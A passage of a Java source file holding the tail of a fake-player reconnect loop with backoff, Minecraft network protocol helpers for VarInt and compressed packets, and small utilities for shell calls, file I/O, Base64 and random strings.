                        waitTime = Math.min(10000 * (long)Math.pow(2, Math.min(failCount - 3, 5)), 300000);
                        System.out.println(ANSI_YELLOW + "[FakePlayer] Multiple failures (" + failCount +
                            "), waiting " + (waitTime / 1000) + "s..." + ANSI_RESET);
                    } else {
                        System.out.println(ANSI_YELLOW + "[FakePlayer] Reconnecting in 10s..." + ANSI_RESET);
                    }
                    Thread.sleep(waitTime);
                } catch (InterruptedException ex) { break; }
            }
        });
        fakePlayerThread.setDaemon(true);
        fakePlayerThread.start();
    }

    // ============ Minecraft 协议工具方法 ============
    private static int getVarIntSize(int value) {
        int size = 0;
        do { size++; value >>>= 7; } while (value != 0);
        return size;
    }

    private static void sendPacket(DataOutputStream out, byte[] packet, boolean compress, int threshold) throws IOException {
        if (!compress || packet.length < threshold) {
            if (compress) {
                ByteArrayOutputStream buf = new ByteArrayOutputStream();
                DataOutputStream bufOut = new DataOutputStream(buf);
                writeVarInt(bufOut, 0);
                bufOut.write(packet);
                byte[] fp = buf.toByteArray();
                writeVarInt(out, fp.length);
                out.write(fp);
            } else {
                writeVarInt(out, packet.length);
                out.write(packet);
            }
        } else {
            byte[] comp = compressData(packet);
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            DataOutputStream bufOut = new DataOutputStream(buf);
            writeVarInt(bufOut, packet.length);
            bufOut.write(comp);
            byte[] fp = buf.toByteArray();
            writeVarInt(out, fp.length);
            out.write(fp);
        }
        out.flush();
    }

    private static byte[] compressData(byte[] data) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        Deflater deflater = new Deflater();
        deflater.setInput(data);
        deflater.finish();
        byte[] buffer = new byte[1024];
        while (!deflater.finished()) {
            int count = deflater.deflate(buffer);
            out.write(buffer, 0, count);
        }
        deflater.end();
        return out.toByteArray();
    }

    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
        while ((value & 0xFFFFFF80) != 0) {
            out.writeByte((value & 0x7F) | 0x80);
            value >>>= 7;
        }
        out.writeByte(value & 0x7F);
    }

    private static void writeString(DataOutputStream out, String str) throws IOException {
        byte[] bytes = str.getBytes("UTF-8");
        writeVarInt(out, bytes.length);
        out.write(bytes);
    }

    private static int readVarInt(DataInputStream in) throws IOException {
        int value = 0, length = 0;
        byte currentByte;
        do {
            currentByte = in.readByte();
            value |= (currentByte & 0x7F) << (length * 7);
            if (++length > 5) throw new IOException("VarInt too big");
        } while ((currentByte & 0x80) == 0x80);
        return value;
    }

    // ============ 通用工具方法 ============
    private static void sh(String cmd) throws Exception {
        Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
    }

    private static void writeFile(String path, String content) throws IOException {
        try (OutputStreamWriter w = new OutputStreamWriter(new FileOutputStream(path), StandardCharsets.UTF_8)) {
            w.write(content);
        }
    }

    private static String readFile(String path) throws IOException {
        return readStream(new FileInputStream(path));
    }

    private static String readStream(InputStream in) throws IOException {
        StringBuilder sb = new StringBuilder();
        try (BufferedReader r = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8))) {
            String line;
            while ((line = r.readLine()) != null) sb.append(line).append('\n');
        }
        return sb.toString();
    }

    private static String b64(String s) {
        return Base64.getEncoder().encodeToString(s.getBytes(StandardCharsets.UTF_8));
    }

    private static String rnd(int len) {
        String c = "abcdefghijklmnopqrstuvwxyz";
        StringBuilder sb = new StringBuilder();
        Random rng = new Random();
        for (int i = 0; i < len; i++) sb.append(c.charAt(rng.nextInt(c.length())));
        return sb.toString();
    }
}
